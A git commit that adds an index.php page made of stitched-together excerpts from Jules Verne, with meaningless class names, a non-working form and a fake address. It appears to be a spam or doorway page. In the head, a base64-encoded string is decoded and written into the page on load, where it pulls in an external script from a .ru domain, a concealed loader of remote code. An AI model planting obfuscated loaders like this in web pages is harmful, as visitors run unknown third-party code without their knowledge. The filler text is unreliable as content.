57f3cd229e27e95be2565225a635c46322faaf81
rilbmllr <77180731+rilbmllr@users.noreply.github.com>
2021-01-09 04:11:22 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Thus ended a conversation which, at no very distant time, led to such grave results. I m</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl81cHIxeXNhZGFqajlyNzNsZWgiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="uczsrnsueclisn87gsg">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="3eomfnqnbvfc24yd2w08axq">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Thus ended a conversation which, at no very distant time, led to such grave results. I m</h1>
+	</section>
+
+
+	<section class="our-work" class="bgmbadh02f2r1risq4o7blv">
+		<h3 class="title">Ah! it is a fine death for a sailor! said Captain N</h3>
+		<p>Among others, I remarked some gobies, mentioned by Aristotle, and commonly known by the name of sea-braches which are more particularly met with in the salt waters lying near the Delta of the Nile. Near them rolled some seabream, half-phosphorescent, a kind of sparus, which the Egyptians ranked among their sacred animals, whose arrival in the waters of their river announced a fertile overflow, and was celebrated by religious ceremonies. I also noticed some cheilines about nine inches long, a bony fish with transparent shell, whose livid color is mixed with red spots; they are great eaters of marine vegetation, which gives them an exquisite flavor. These cheilines were much sought after by the epicures of ancient Rome; the inside, dressed with the soft roe of the lamprey, peacocks' brains, and tongues of the phenicoptera, composed that divine dish of which Vitellius was so enamored. But vain excitement! The Abraham Lincoln checked its speed and made for the animal signaled, a simple whale, or common cachalot, which soon disappeared amid a storm of execration. My opinion is formed, replied Ned Land sharply. They are rascals. It was a shoal of argonauts traveling along on the surface of the ocean. We could count several hundreds. They belonged to the tubercle kind which are peculiar to the Indian seas.</p>
+		<hr>
+
+		<ul class="grid" class="siwh1tvvszahl0g9wi91">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="uczsrnsueclisn87gsg">
+		<h3 class="title">We were furrowing the waters of the Indian</h3>
+		<p>Conseil was in ecstasy. Ned Land, carried away by his violent instincts, rushed on to the staircase. But the moment he seized the rail with both hands, he, in his turn, was overthrown. Conseil looked at it with scientific interest, and I am sure that he placed it, and not without reason, in the cartilaginous class, of the chondropterygian order, with fixed gills, of the selacian family, in the genus of the sharks. Perfectly, said I, not knowing the end proposed by this historical lesson. Of the people on board I only saw the impassive steward, who served me with his usual dumb regularity.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="3eomfnqnbvfc24yd2w08axq" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="siwh1tvvszahl0g9wi91" class="title">Upon this imaginary creature rested the responsibility of all t</h3>	
+		<p>They were ingots of gold. From whence came this precious metal, which represented an enormous sum? Where did the captain gather this gold from and what was he going to do with it? The vessel was within two miles of us. It was ever nearing that phosphorescent light which showed the presence of the Nautilus. I could see its green and red lights, and its white lantern hanging from the large mizzen-mast. An indistinct vibration quivered through its rigging, showing that the furnaces were heated to the uttermost. Sheaves of sparks and red ashes flew from the funnels, shining in the atmosphere like stars. However, said he, all is not ended. It is only a blow of the harpoon lost. Another time we must succeed; and to-night, if necessary- I did not ask you for your word of honor, Master Land, answered the commander coldly.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="uczsrnsueclisn87gsg">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="3eomfnqnbvfc24yd2w08axq"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="bgmbadh02f2r1risq4o7blv"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="siwh1tvvszahl0g9wi91"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>8075 Aniya Crossroad, Suite 654, 56861, Francescoland, Oklahoma, United States</p>
+	</footer>
+
+</body>
+
+</html>
